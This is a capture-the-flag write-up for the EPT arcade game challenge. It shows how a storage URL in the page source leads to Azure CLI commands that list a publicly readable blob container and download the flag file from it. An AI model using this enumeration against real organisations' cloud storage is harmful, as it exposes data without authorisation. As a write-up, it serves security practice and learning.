# EPT ARCADE GAME

## Description
You are welcome to play the 2024 EPT arcade game. We hope you enjoy it!

arcadegame.ept.gg

## Solution

The game is a simple game that one can play. Looking at the index we can see a interesting url: `https://a8261cebfbaccblob.blob.core.windows.net/private/ept.svg`. 

From this we can see that the game is hosted on Azure Blob Storage. We can use the Azure CLI to list the blobs in the container.
```bash
❯  az storage blob list --account-name a8261cebfbaccblob --container-name private --output table

There are no credentials provided in your command and environment, we will query for account key for your storage account.
It is recommended to provide --connection-string, --account-key or --sas-token in your command as credentials.

You also can add `--auth-mode login` in your command to use Azure Active Directory (Azure AD) for authorization if your login account is assigned required RBAC roles.
For more information about RBAC roles in storage, visit https://docs.microsoft.com/azure/storage/common/storage-auth-aad-rbac-cli.

In addition, setting the corresponding environment variables can avoid inputting credentials in your command. Please use --help to get more information about environment variable usage.

Skip querying account key due to failure: Please run 'az login' to setup account.
Name              Blob Type    Blob Tier    Length    Content Type              Last Modified              Snapshot
----------------  -----------  -----------  --------  ------------------------  -------------------------  ----------
ept.png           BlockBlob    Hot          3281      application/octet-stream  2024-10-19T19:04:15+00:00
ept.svg           BlockBlob    Hot          1577      image/svg+xml             2024-10-19T19:04:15+00:00
flag-1s-h3r3.txt  BlockBlob    Hot          37        application/octet-stream  2024-10-19T19:04:15+00:00
```

Here we can see that there is a flag in the container. We can download it using the Azure CLI again.
```bash
az storage blob download --account-name a8261cebfbaccblob --container-name private --name flag-1s-h3r3.txt --file ./flag-1s-h3r3.txt
```
